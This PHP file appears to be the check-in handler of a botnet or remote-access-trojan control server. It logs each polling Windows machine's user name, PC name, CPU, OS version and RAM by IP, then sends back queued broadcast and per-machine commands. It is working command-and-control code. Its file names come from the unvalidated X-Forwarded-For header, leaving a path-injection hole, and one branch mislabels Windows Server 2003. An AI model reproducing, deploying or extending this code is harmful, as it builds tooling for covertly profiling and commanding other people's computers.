<?php
	
	include_once('rqp_rsp.php');
	
	function _error_handle(){
		
	}

	if(!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	}
	else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} 
	else{
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	
	$user = $_GET['us'];
	$comp = $_GET['pc'];
	$cpu  = $_GET['cpu'];
	$win  = $_GET['win'];
	$ram  = $_GET['ram'];
	
	/*
	$user = explode(',', $user);
	$userStr = '';
	for($i = 0; $i < count($user); ++$i){
		$userStr .= mb_convert_encoding('&#' . intval($user[$i]) . ';', 'UTF-8', 'HTML-ENTITIES');
	}*/
	$userStr = $user;
	
	/*
	$comp = explode(',', $comp);
	$pcStr = '';
	for($i = 0; $i < count($comp); ++$i){
		$pcStr .= mb_convert_encoding('&#' . intval($comp[$i]) . ';', 'UTF-8', 'HTML-ENTITIES');
	}
	*/
	$pcStr = $comp;
	
	if(strlen($win) != 0) {
		$win = explode(',', $win);
		if((int)$win[0] == 5){
			if((int)$win[1] == 0){	// Windows 2000
				$win = 'Windows 2000';
			}
			else if((int)$win[1] == 1){	// Windows XP
				$win = 'Windows XP';
			}
			else if((int)$win[1] == 2){
				if((int)$win[2] == 0){	// Windows XP x64 Professional
					$win = 'Windows XP x64 Professional';
				}
				else if((int)$win[2] == 1){ // Windows Server 2003
					$win = 'Windows XP x64 Professional';
				}
				else if((int)$win[2] == 2){ // Windows Home Server
					$win = 'Windows Home Server';
				}
				else if((int)$win[2] == 3){ // Windows Server 2003 R2
					$win = 'Windows Server 2003 R2';
				}
			}
			
		}
		else if((int)$win[0] == 6){
			if((int)$win[1] == 0){
				if((int)$win[2] == 0){	// Windows Vista
					$win = 'Windows Vista';
				}
				else if((int)$win[2] == 1){	// Windows Server 2008
					$win = 'Windows Server 2008';
				}
			}
			else if((int)$win[1] == 1){
				if((int)$win[2] == 0){	// Windows Server 2008 R2
					$win = 'Windows Server 2008 R2';
				}
				else if((int)$win[2] == 1){	// Windows 7
					$win = 'Windows 7';
				}
			}
			else if((int)$win[1] == 2){
				if((int)$win[2] == 0){	// Windows Server 2012
					$win = 'Windows Server 2012';
				}
				else if((int)$win[2] == 1){	// Windows 8
					$win = 'Windows 8';
				}
			}
			else if((int)$win[1] == 3){
				if((int)$win[2] == 0){	// Windows Server 2012 R2
					$win = 'Windows Server 2012 R2';
				}
				else if((int)$win[2] == 1){	// Windows 8.1
					$win = 'Windows 8.1';
				}
			}
		}
		else if((int)$win[0] == 10){
			if((int)$win[1] == 0){
				if((int)$win[2] == 0){	// Windows Server 2016 
					$win = 'Windows Server 2016';
				}
				else if((int)$win[2] == 1){	// Windows 10
					$win = 'Windows 10';
				}
			}		
		}
	}
	
	$ram = round((int)$ram / 1048576);
	
	if(!$file = @fopen('../buffer/pings/' . $ip . '.ip', 'w')){
		_error_handle();
	}
	else{
		if(!fwrite($file, $userStr . "\n")){
			_error_handle();
		}
		if(!fwrite($file, $pcStr . "\n")){
			_error_handle();
		}
		if(!fwrite($file, $win . "\n")){
			_error_handle();
		}
		if(!fwrite($file, $cpu . "\n")){
			_error_handle();
		}
		if(!fwrite($file, (string)$ram . "\n")){
			_error_handle();
		}
		fclose($file);
	}

	$request_files = array("broadcast.stc", $ip . ".src");
	$station_commands = '';
	foreach($request_files as $filename) {
		
		if(!$file = @fopen('../buffer/requests/' . $filename, 'r')) {
			_error_handle();
		}
		else {
			$chr = '';
			while($line = trim(fgets($file))) {
				$station_commands .= $chr . 'COMMAND|' . $line;
				$chr = '|';
			}
		}
	}
	
	if(strlen($station_commands) == 0) {
		echo toRSPstring('DIE', array(), array());
	}
	else {
		echo toRSPstring('LIVE', array(), explode('|', $station_commands));
	}

?>
